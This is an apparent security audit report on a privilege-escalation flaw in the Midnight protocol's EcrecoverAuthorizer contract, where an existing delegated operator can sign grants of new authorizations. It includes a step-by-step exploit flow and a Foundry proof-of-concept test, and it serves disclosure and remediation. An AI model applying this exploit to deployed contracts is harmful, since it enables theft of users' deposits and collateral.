### Title
Delegated Operator Can Grant Arbitrary New Authorizations via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address already authorized by `authorization.authorizer` in Midnight, not only from the authorizer themselves. A compromised or malicious operator B (where `isAuthorized[A][B] == true`) can therefore sign an `Authorization{authorizer=A, authorized=C}` and submit it, causing `isAuthorized[A][C]` to be set to `true` in Midnight without any action from A. This allows attacker-controlled address C to borrow, withdraw, seize collateral, and cancel offers on behalf of A.

### Finding Description
**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24–48) recovers the signer from the EIP-712 digest and then checks:

```solidity
// src/periphery/EcrecoverAuthorizer.sol:33-36
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch of the `||` passes whenever `signer` is any address already authorized by `authorization.authorizer` in Midnight — i.e., any existing operator of A. If the check passes, the contract calls:

```solidity
// src/periphery/EcrecoverAuthorizer.sol:46-47
IMidnight(MIDNIGHT)
    .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

`Midnight.setIsAuthorized` (lines 731–735) then accepts this call because `msg.sender` is `EcrecoverAuthorizer` and `isAuthorized[A][EcrecoverAuthorizer] == true` (required precondition for EcrecoverAuthorizer to function at all):

```solidity
// src/Midnight.sol:731-734
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
```

**Exploit flow:**

1. A calls `midnight.setIsAuthorized(EcrecoverAuthorizer, true, A)` — normal setup.
2. A calls `midnight.setIsAuthorized(B, true, A)` — grants B operator rights.
3. B (compromised) constructs `Authorization{authorizer=A, authorized=C, isAuthorized=true, nonce=nonce[A], deadline=...}` and signs it with B's key.
4. Anyone calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
5. Recovered signer = B; `isAuthorized[A][B] == true` → check passes.
6. `midnight.setIsAuthorized(C, true, A)` executes → `isAuthorized[A][C] = true`.
7. C calls `midnight.withdraw / take / withdrawCollateral` on behalf of A, draining A's funds and collateral.

**Why existing checks fail:** The nonce is keyed on `authorization.authorizer` (A), so B uses A's current nonce — which B can read from `ecrecoverAuthorizer.nonce(A)` — and the nonce check passes. There is no check that the signer is the authorizer themselves; the delegated-operator branch is an unintended privilege escalation path.

### Impact Explanation
A's funds (loan token deposits, collateral) can be directly stolen by attacker C. C can call `withdraw` to drain A's deposited assets, `take` to open debt positions on A's behalf, `withdrawCollateral` to seize A's collateral, and `setConsumed` to cancel A's offers — all without A's knowledge or consent.

### Likelihood Explanation
Preconditions are realistic and common: any user who has granted operator rights to a third-party contract or address (e.g., a bot, a UI relayer, a yield strategy) and has also enabled `EcrecoverAuthorizer` is exposed. The attack is repeatable (B can issue multiple authorizations before A notices), requires no special privileges beyond being an existing operator, and is fully permissionless to trigger (anyone can submit the signed authorization).

### Recommendation
Remove the delegated-operator branch from `EcrecoverAuthorizer`. The purpose of `EcrecoverAuthorizer` is to allow the authorizer to act via an off-chain signature; only the authorizer's own key should be accepted:

```solidity
// src/periphery/EcrecoverAuthorizer.sol:33-36
require(signer == authorization.authorizer, Unauthorized());
```

If delegation through EcrecoverAuthorizer is intentional, it must be explicitly scoped and documented, and the invariant that "only the authorizer's own signature can grant new authorizations" must be enforced at a higher level.

### Proof of Concept
```solidity
// Foundry unit test (add to SetIsAuthorizedWithSigTest.sol or a new file)
function testDelegatedOperatorCanGrantArbitraryAuthorization() public {
    address A       = makeAddr("A");
    address B       = makeAddr("B");       // compromised operator
    address C       = makeAddr("attacker");
    uint256 bKey    = 0xB0B; // B's private key (known to attacker)
    B = vm.addr(bKey);

    // A sets up: authorizes EcrecoverAuthorizer and B
    vm.startPrank(A);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A);
    midnight.setIsAuthorized(B, true, A);
    vm.stopPrank();

    // B (compromised) signs Authorization{authorizer=A, authorized=C, isAuthorized=true}
    Authorization memory auth = Authorization({
        authorizer:   A,
        authorized:   C,
        isAuthorized: true,
        nonce:        ecrecoverAuthorizer.nonce(A),
        deadline:     block.timestamp + 1 days
    });
    bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
    bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                               block.chainid,
                                               address(ecrecoverAuthorizer)));
    bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(bKey, digest);
    Signature memory sig = Signature({v: v, r: r, s: s});

    // Anyone submits — A never signed this
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // ASSERTION: C must NOT be authorized — but it IS, proving the bug
    assertEq(midnight.isAuthorized(A, C), true); // bug: should be false
}
```

Expected: `isAuthorized[A][C]` is `true` after B's signature, with A never having signed anything authorizing C. The fix causes this test to revert at the `Unauthorized()` check.